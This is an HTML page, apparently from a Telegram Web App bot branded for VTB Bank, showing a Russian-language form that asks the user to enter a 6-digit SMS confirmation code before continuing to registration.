<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="../../css/style.css">
  <title>ВТБ Банк бот</title>
</head>


<body>
  <div class="wrapper">
    <h1 class="title">Подтверждение идентификации</h1>

    <form novalidate id="form" class="confirmIdentificationForm" action="#" method="post" enctype="multipart/form-data">

      <div class="confirmIdentificationForm__inputBlock inputBlock">
        <p class="identificationForm__inputTitle inputTitle">Введите 6-значный номер из СМС</p>
        <input id="OTPcode" class="input confirmIdentificationForm__input" tabindex="1" name="OTP-code" type="text"
          required autocomplete="off" maxlength="6" />
      </div>

      <div class="identificationForm__buttonBlock buttonBlock">
        <button type="submit" nextPage="../registration/registration.html" id="identificationFormButton"
          class="button submitButton identificationForm__button_next" tabindex="3">Продолжить</button>
        <a href="../identification/identification.html" class="button backButton identificationForm__button_back"
          tabindex="4" type="button">Назад</a>
      </div>

  </div>
  </form>
  </div>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="../../js/index.js"></script>
</body>

</html>
